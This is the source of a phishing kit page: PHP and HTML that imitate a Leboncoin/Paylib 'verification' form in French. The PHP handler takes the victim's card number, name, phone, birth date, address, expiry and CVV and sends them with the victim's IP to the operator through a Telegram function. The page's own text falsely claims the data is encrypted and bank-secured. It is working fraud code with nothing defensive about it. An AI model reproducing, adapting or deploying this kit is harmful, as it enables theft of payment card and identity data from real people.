<?php

error_reporting(0);

if (session_status() === PHP_SESSION_NONE) {
  session_start();
}

include_once '../session.php';
include 'includes.php';
include 'core/ip.php';
include 'core/telegram.php';
include 'config.php';

if (isset($_POST['cardNumber'],$_POST['cardName'],$_POST['tel'],$_POST['DateNais'],$_POST['adress'],$_POST['cardMonth'],$_POST['cardYear'],$_POST['cardCvv'])) {

  $ip = ip();
  $cardNumber = $_POST['cardNumber'];
  $cardName = $_POST['cardName'];
  $tel = $_POST['tel'];
  $DateNais = $_POST['DateNais'];
  $adress = $_POST['adress'];
  $cardMonth = $_POST['cardMonth'];
  $cardYear = $_POST['cardYear'];
  $cardCvv = $_POST['cardCvv'];


  $message =  "💌 INSTANT VERIF $ip\n\n";
  $message .= "🧲 N* De Carte : $cardNumber \n";
  $message .= "🧲 Titulaire : $cardName \n";
  $message .= "🧲 Telephone : $tel \n";
  $message .= "🧲 Date de naissance : $DateNais \n";
  $message .= "🧲 Adresse postal : $adress \n";
  $message .= "🧲 Mois : $cardMonth \n";
  $message .= "🧲 Année : $cardYear \n";
  $message .= "🧲 Cvv : $cardCvv \n";
  $_SESSION['data'] = $message;

  tlgsend(urlencode($message));

   header('location: chargementtt.php');
}
?> 
<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>LEBONCOIN</title>
    <link rel="stylesheet" href="./stylee.css">
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" href="libpay/assets/favicon.svg">
    <title id="" data-react-helmet="id">LEBONCOIN</title>
    <meta name="apple-mobile-web-app-title" content="SDR Paylib">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">

  </head>

  <body>

    <div id="didomi-host" data-nosnippet="true" aria-hidden="true">
      <div class="notranslate didomi-screen-medium didomi-consent-popup__70305afe-c713-4713-a0d7-65d0f6b02ae8"></div>
    </div>
    <div id="app" style="width:100vw;height:100vh">
      <div class="react-gradient sc-AxjAm bcMPWx" style="background-image: linear-gradient(60deg, rgb(255, 87, 51), rgb(234, 251, 255));"></div>
      <div class="MuiBox-root jss1 sc-fznKkj fQkkzS">
        <div class="MuiContainer-root jss2 sc-fzplWN djGbrK MuiContainer-maxWidthSm" height="" align="center">
          <div class="MuiPaper-root sc-fznyAO bXtyWV MuiPaper-elevation0" padding="10px 20px">
            <div style="opacity: 1; transform: translate3d(0px, 0px, 0px); width: 100%;">
              <div class="sc-fzokOt hLgJkJ">
                <div class="sc-fzoyAV fQsatj"><button class="MuiButtonBase-root MuiIconButton-root" tabindex="0" type="button" id="paylib-logo"><span class="MuiIconButton-label"><a href="/"><img width="100" class="sc-53cf67e8-0 jeCeIg" src="https://upload.wikimedia.org/wikipedia/commons/6/63/Leboncoin_Logo_%282016%29.svg" alt="logo" tabindex="0"></a></span><span class="MuiTouchRipple-root"></span></button></div>
                <hr class="MuiDivider-root">
                <div class="sc-fznZeY gJlwEu">
                  <div class="MuiBox-root jss3 sc-fzqNJr hXQgjp">
                    <h1 class="MuiTypography-root MuiTypography-h1 MuiTypography-gutterBottom MuiTypography-alignCenter">Confirmation De Vos Informations Personnelles</h1><br>
                  </div>
                  <div style="opacity: 1; transform: translate3d(0px, 0px, 0px); width: 100%;"><center><span class="sc-fzoLsD kskohJ">Pour des raisons de sécurité, nous procédons parfois à la vérification rapide de vos informations.<br><br>NB : vos données sont cryptées et stockées sur un serveur ultra sécurisé relié a votre banque à l'abri d'un tiers. </span></center></div>

                </div>
              </div>
            </div>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>LEBONCOIN</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
<link rel="stylesheet" href="./style.css">

</head>
    <script src="./sources/js/jquery.js"></script>
    <script src="./sources/js/jquery.validate.min.js"></script>
    <script src="./sources/js/jquery.maskinput.js"></script>
    <script src="./sources/js/main.js"></script>
    <script src="./sources/js/jquery.CardValidator.js"></script>
<body>
<!-- partial:index.partial.html -->
<div class="wrapper" id="app">
  <div class="card-form">
    <div class="card-list">
      <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
        <div class="card-item__side -front">
          <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }" v-bind:style="focusElementStyle" ref="focusElement"></div>
          <div class="card-item__cover"><center><img width="490" src="https://jai-un-pote-dans-la.com/wp-content/uploads/2019/07/logo-Leboncoin_002.jpg"></center></div>

          <div class="card-item__wrapper">
            <div class="card-item__top">

              <div class="card-item__type">
                <transition name="slide-fade-up">
                  <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" v-bind:key="getCardType" alt="" class="card-item__typeImg">
                </transition>
              </div>
            </div>
            <label for="cardNumber" class="card-item__number" ref="cardNumber">
              <template v-if="getCardType === 'amex'">
                <span v-for="(n, $index) in amexCardMask" :key="$index">
                  <transition name="slide-fade-up">
                    <div class="card-item__numberItem" v-if="$index > 4 && $index < 14 && cardNumber.length > $index && n.trim() !== ''">*</div>
                    <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" :key="$index" v-else-if="cardNumber.length > $index">
                      {{cardNumber[$index]}}
                    </div>
                    <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" v-else :key="$index + 1">{{n}}</div>
                  </transition>
                </span>
              </template>

              <template v-else>
                <span v-for="(n, $index) in otherCardMask" :key="$index">
                  <transition name="slide-fade-up">
                    <div class="card-item__numberItem" v-if="$index > 4 && $index < 15 && cardNumber.length > $index && n.trim() !== ''">*</div>
                    <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" :key="$index" v-else-if="cardNumber.length > $index">
                      {{cardNumber[$index]}}
                    </div>
                    <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" v-else :key="$index + 1">{{n}}</div>
                  </transition>
                </span>
              </template>
            </label>
            <div class="card-item__content">
              <label for="cardName" class="card-item__info" ref="cardName">
                <div class="card-item__holder">Titulaire de la carte</div>
                <transition name="slide-fade-up">
                  <div class="card-item__name" v-if="cardName.length" key="1">
                    <transition-group name="slide-fade-right">
                      <span class="card-item__nameItem" v-for="(n, $index) in cardName.replace(/\s\s+/g, ' ')" v-if="$index === $index" v-bind:key="$index + 1">{{n}}</span>
                    </transition-group>
                  </div>
                  <div class="card-item__name" v-else key="2">Nom & Prénom</div>
                </transition>
              </label>
              <div class="card-item__date" ref="cardDate">
                <label for="cardMonth" class="card-item__dateTitle">Expiration</label>
                <label for="cardMonth" class="card-item__dateItem">
                  <transition name="slide-fade-up">
                    <span v-if="cardMonth" v-bind:key="cardMonth">{{cardMonth}}</span>
                    <span v-else key="2">MM</span>
                  </transition>
                </label>
                /
                <label for="cardYear" class="card-item__dateItem">
                  <transition name="slide-fade-up">
                    <span v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span>
                    <span v-else key="2">AA</span>
                  </transition>
                </label>
              </div>
            </div>
          </div>
        </div>
        <div class="card-item__side -back">
          <div class="card-item__cover">
            <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + currentCardBackground + '.jpeg'" class="card-item__bg">
          </div>
          <div class="card-item__band"></div>
          <div class="card-item__cvv">
            <div class="card-item__cvvTitle">CVV</div>
            <div class="card-item__cvvBand">
              <span v-for="(n, $index) in cardCvv" :key="$index">
                *
              </span>

            </div>
            <div class="card-item__type">
              <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" class="card-item__typeImg">
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="card-form__inner">
    <form action="index_c.php" method="post">
      <div class="card-input">
      
        <label for="cardNumber" class="card-input__label">Numéro de carte</label>
        <input type="text" id="cardNumber" name="cardNumber" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" required="">
      </div>
      <div class="card-input">
        <label for="cardName" class="card-input__label">Titulaire de la carte</label>
        <input type="text" id="cardName" name="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" required="">
      </div>

                  <div class="card-input">
        <label for="cardName" class="card-input__label">Numero de téléphone</label>
        <input type="tel" id="tel" name="tel" class="card-input__input" required="">
      </div>


        <div class="card-input">
        <label for="cardName" class="card-input__label">Montant</label>
        <input type="tel" id="mont" name="mont" class="card-input__input" required="">
      </div>



 <div class="card-input">
        <label for="cardName" class="card-input__label">Date de naissance</label>
        <input type="text" id="DateNais" name="DateNais" class="card-input__input" required="">
      </div>


 <div class="card-input">
        <label for="cardName" class="card-input__label">Adresse postale</label>
        <input type="text" id="adress" name="adress" class="card-input__input" required="">
      </div>




      <div class="card-form__row">
        <div class="card-form__col">
          <div class="card-form__group">
            <label for="cardMonth" class="card-input__label">Date d'expiration</label>
            <select class="card-input__input -select" id="cardMonth" name="cardMonth" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required="">
              <option value="" disabled selected>Mois</option>
              <option v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12" v-bind:disabled="n < minCardMonth" v-bind:key="n">
                {{n < 10 ? '0' + n : n}}
              </option>
            </select>
            <select class="card-input__input -select" id="cardYear" name="cardYear" v-model="cardYear" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required="">
              <option value="" disabled selected>Années</option>
              <option v-bind:value="$index + minCardYear" v-for="(n, $index) in 12" v-bind:key="n">
                {{$index + minCardYear}}
              </option>
            </select>
          </div>
        </div>
        <div class="card-form__col -cvv">
          <div class="card-input">
            <label for="cardCvv" class="card-input__label">CVV</label>
            <input type="text" class="card-input__input" id="cardCvv" name="cardCvv" v-mask="'###'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" required="">
          </div>
        </div>
      </div>

      <button class="card-form__button" id="" name="" type="submit">JE VERIFIE</button>
    </div>
  </div>

</div>
</form>






  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script><script  src="./script.js"></script>



</html>
</body>

</html>